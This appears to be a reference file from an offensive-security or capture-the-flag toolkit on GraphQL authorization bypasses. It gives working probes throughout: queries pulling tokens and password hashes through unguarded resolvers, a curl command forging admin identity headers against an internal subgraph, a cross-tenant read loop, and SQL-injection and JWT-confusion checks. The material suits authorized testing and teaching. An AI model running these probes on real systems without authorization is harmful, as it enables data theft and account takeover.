# Authorization bypass — per-resolver vs per-endpoint

GraphQL's most consequential design fact: **the HTTP endpoint authenticates
the caller; each resolver independently decides authorization**. Any layer
that forgets a check — or checks the wrong identity — is a bypass. This file
enumerates the failure shapes and the probes that expose each.

---

## 1. The authorization layers, in order

```text
HTTP middleware (JWT verify, session)  →  document validation
   →  schema-level authz (@auth directives, gateway policies)
      →  resolver-level authz (code inside each field)
         →  data-level authz (row filters in the ORM query)
```

Bugs live at every seam. The attack is finding the layer that *isn't*
enforced.

## 2. The seven bypass shapes

### 2.1 Public wrapper over private resolver

`me` is auth-checked; `user(id:)` fetching the same User type is not.
Different *entry fields* reach the same type with different gates:

```graphql
{me{email}}             # requires auth — 401 or filtered
{user(id:2){email}}     # same data, no check — the bypass
{users{email}}          # list route, often forgotten entirely
{search(q:"victim"){... on User{email}}}   # a third path
```

Every type reachable through ≥2 root fields gets all its paths tested.

### 2.2 Field-level leakage inside an authorized object

`user(id)` enforces ownership at the *root*; `email`, `token`, `sessions` on
the returned type resolve without re-checking:

```graphql
{user(id:5){username}}           # allowed — public
{user(id:5){email token role sessions{token} apiKeys{key}}}   # tested one by one
```

Per-field probes — batch them in aliases to make it cheap (`batching-attacks.md`).

### 2.3 Nested-resolver escape

`post(id)` checks you can read the post; `post.author` resolves the full
`User` type — including private fields — without authz:

```graphql
{post(id:1){author{email passwordHash sessions{token}}}}
{comment(id:9){author{role apiKeys{key}}}}
{feed{items{owner{documents{title content}}}}}
```

Walk the type graph: every edge `A → B` is a path to B that skips B's own
entry-point checks. Sensitive types (`User`, `Session`, `Order`, `Document`)
need every inbound edge tested.

### 2.4 Middleware order — authz runs after the resolver started

Dev-mode servers sometimes log/resolve before auth middleware in error paths;
also `OPTIONS`/preflight and `GET` transports may skip auth middleware that
was registered POST-only (see `csrf-graphql.md`).

### 2.5 Role-scoped schema — filtered view, unfiltered resolution

Introspection shows a *reduced* schema per role, but resolvers still honor
the hidden fields (`introspection.md` §5). Probe admin-sounding names
directly:

```graphql
{adminUsers{email}}
{internalConfig{dbPassword}}
{debug{env}}
mutation{impersonate(userId:1){token}}
```

### 2.6 Directive-based authz that doesn't enforce

Schema `@auth(requires:ADMIN)` / `@hasRole` / `@isAuthenticated` are
*declared* — a custom directive must implement the check. Bugs:

- Directive declared but resolver code skips it (dead annotation).
- Directive checks JWT presence, not claims — any logged-in user passes
  `requires:ADMIN`.
- Directive on the field definition but fields resolved via a different path
  (subgraph vs gateway).

Probe: call the `@auth`-decorated field with a low-privilege token anyway.
The directive is decoration until proven enforced.

### 2.7 Federation authz split

Gateway authenticates; subgraph resolvers trust. Direct-to-subgraph requests
(when the subgraph port leaks) carry no auth context at all — or accept a
self-minted `x-user-id` header the gateway normally injects:

```bash
curl -s "http://subgraph.internal:4001/graphql" \
  -H 'Content-Type: application/json' \
  -H 'x-user-id: 1' -H 'x-user-role: admin' \
  -d '{"query":"{adminData}"}'
```

Details in `federation.md` §authz.

## 3. Two-role differential — the systematic method

Own two identities (register twice: `u1`, `u2`) and diff *every* sensitive
field across roles:

```bash
for f in email phone role token sessions apiKeys balance ssn; do
  echo "== $f"
  curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $U1_TOKEN" \
    -d "{\"query\":\"{user(id:$U2_ID){$f}}\"}" | jq -c '.data,.errors'
done
```

Three outcome classes:

- `data: {f: value}` — **cross-tenant read**, impact.
- `errors: Forbidden/not authorized` — per-field authz present.
- `data: {f: null}` — field exists, nulled for non-owner — authz by filtering;
  try the nested-path escape (§2.3) which often skips the filter.

Admin role differential: register a low user, probe admin-named fields —
`admin*`, `internal*`, `debug*`, `audit*`, `all*` list variants.

## 4. Token-context confusions

- **Token in header vs cookie vs arg**: `flag(token:)` fields take the token
  as an *argument* — the corpus's proven pattern: an unguarded `users{token}`
  hands you what the guarded `flag` demands. Pair the two:

```graphql
{ users { username token } }                      # unguarded listing
{ flag(token: "<stolen>") }                       # guarded by arg token
```

- **JWT confusion**: mutation `login` returns a JWT — check `alg:none`,
  weak secret, `kid` injection (`skills/web-auth-session/`,
  `session_dissect.py`).
- **Context from cookies**: the GraphQL endpoint may read a session cookie
  the REST API also reads — a stolen cookie from XSS is auth here too.

## 5. Validation-order quirks

Resolvers receive args the *validator* already approved — but validation is
type-only. Where code does `db.get(arg.id)` before `check(auth)`:

```graphql
{ user(id:"1' OR 1=1--"){id} }    # injection runs before authz in bad code
```

The sql error may appear even without a session — the resolver fired. That
is the authz-timing bug: the sink executes regardless of the authz verdict.

## 6. Ledger entries

```bash
python3 tools/state.py $CHAL --hypothesis \
  "nested resolver reaches User.email without authz — path: post→author"
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {post(id:1){author{email}}}' \
  --verdict confirms --evidence-kind impact --class web-graphql \
  --hypothesis-id h4 --evidence '"author":{"email":"victim@x.tld"}' \
  --response '<verbatim>'
```

A public *listing* that is intentionally public (public profiles) is NOT the
finding — only private-shaped fields (`email`, `token`, `role`, `sessions`,
`passwordHash`, `ssn`, `balance`, `documents`) count. When unsure which are
private, compare what *your own* record shows vs what the app displays to
others — the diff is the private set.
